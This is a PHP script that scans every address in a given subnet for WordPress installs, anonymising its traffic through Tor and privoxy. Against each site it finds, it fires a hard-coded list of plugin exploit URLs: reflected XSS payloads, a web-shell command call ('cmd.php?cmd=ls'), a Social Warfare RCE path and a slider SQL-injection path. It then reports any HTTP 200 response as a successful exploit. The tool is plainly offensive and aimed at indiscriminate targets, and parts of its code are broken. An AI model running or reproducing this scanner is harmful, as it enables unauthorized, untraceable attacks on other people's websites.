<?php
/*
    Written by Mouri
    TO find out why PHP is unpopular
    anyway, this goes through a given subnet and tries to exploit
    a large number of wordpress sites.

*/

//assuming proper format (http://address/wordpress/)
function run_attack_slider($url) { 
    //need more exploits for this
    $atks = array (
        "6.1 slider" => "/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***&taction=edit",
       "woocommerce 1.2.181030 XSS" => "/wordpress/wp-content/plugins/ecpay-logistics-for-woocommerce/getChangeResponse.php?&CVSStoreName=hola2%22;%20%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
       "woocommerce 1.6.7 XSS" => "http://54.174.186.120//wordpress/wp-content/plugins/spryng-payments-woocommerce/views/public/threed_authenticate.php?url=http://google.es%22%20%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%20%3Cdemo=%22",
       "Social Photo Gallery 1.0 RCE" => "/wordpress/wp-content/uploads/socialphotogallery/demo/cmd.php?cmd=ls",
        "plainview activity monitor RCE" => "/wp-admin/admin.php",
        //"Wordpress Databse Backup RCE" => "/wp-content/plugins/wp-database-backup/readme.txt,"
        "Wordpress Social Warfare RCE" => "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s",

    );
    //should probably do concurrency here
    $keys = array_keys($atks);
    for ($i = 0; $i < count($keys); $i++) { 
        $atk_host = $url . $atks[$keys[$i]];
        $code_success = "200";
        $code_return  = send_tor_request($atk_host);
        if (!strcmp($code_return, $code_success)) { 
            echo "exploit succeeded: " . $keys[$i] . PHP_EOL;
        }
        else { 
            echo "exploit failed: " .  $keys[$i]. PHP_EOL;
        }
    }

}

//return code 
function send_tor_request($url) {
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, "localhost:8118"); // Default privoxy port
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    
    $response = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    return $code;
}

$check_tor = system("netstat -a | grep tor");
if (strlen($check_tor) > 0) { 
    echo "tor is running..." . PHP_EOL;
}
else { 
    echo "tor is not running...starting it for you..." . PHP_EOL;
    system("sudo service tor start");
    system("/etc/init.d/privoxy restart");
}

$input = readline ("enter base ip: ");
$input_sub = readline("enter subnet: ");
//find a running wordpress
$path = "/wp-login.php";
//find the number of ip addresses for the subnet
$count = 1 << (32 - $input_sub);
echo "using a subnet of: " . $count . PHP_EOL;
$start = ip2long($input);
for ($i = 0; $i < $count; $i++) {
    $ip = long2ip($start + $i);
    $url = "http://" . $ip . $path; //target
    echo "testing target: " . $url . PHP_EOL;
    try{
    $code = send_tor_request($url);
    //echo "curl response code: " . $code . PHP_EOL;
    $look_for = "200";
    if (!strcmp($code, $look_for)) { 
        echo "found wordpress on: " . $ip . PHP_EOL;
        $new_url = "http://" . $ip;
        echo "trying Slider 6.1 SQL Injection on " . $ip . PHP_EOL;
        run_attack_slider($new_url);
    }
    else {
        echo "wordpress not found on: " . $ip . PHP_EOL;
    }
   // echo "response: " . $response;
    curl_close($ch);
    }
    catch (exception $e) { 
        echo "curl failed..." . PHP_EOL;
    }
   
}




?>